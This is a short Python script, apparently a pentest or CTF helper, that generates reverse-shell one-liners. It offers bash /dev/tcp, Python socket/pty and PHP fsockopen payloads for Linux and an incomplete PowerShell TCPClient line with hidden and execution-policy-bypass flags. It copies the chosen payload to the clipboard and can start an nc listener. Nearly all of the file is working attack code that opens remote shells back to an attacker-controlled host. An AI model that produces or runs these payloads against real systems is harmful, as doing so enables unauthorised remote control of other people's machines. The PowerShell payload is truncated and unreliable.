import subprocess
import pyperclip
from rich import print

def detect_ip(interface):

    cmd = f"ip addr show {interface}"
    result = subprocess.getoutput(cmd)

    for line in result.split("\n"):
        if "inet " in line:
            return line.strip().split()[1].split("/")[0]

    return None


def run_revshell(lhost, lport):

    if not lhost:
        lhost = input("LHOST (default tun0): ") or "tun0"

    if not lport:
        lport = input("LPORT (default 4444): ") or "4444"

    if not lhost[0].isdigit():
        lhost = detect_ip(lhost)

    print("\nSelect OS")
    print("1. Linux")
    print("2. Windows")

    os_choice = input("> ")

    payload = ""

    if os_choice == "1":
        print("\n1. bash\n2. python\n3. php")
        p = input("> ")

        if p == "1":
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        elif p == "2":
            payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        elif p == "3":
            payload = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    else:
        print("\n1. powershell")
        p = input("> ")

        if p == "1":
            payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"

    print("\n[+] Payload:\n")
    print(payload)

    pyperclip.copy(payload)
    print("\n[green][+] Copied to clipboard[/]")

    start = input("\nStart listener? (y/N): ")

    if start.lower() == "y":
        subprocess.run(["rlwrap", "nc", "-lvnp", str(lport)])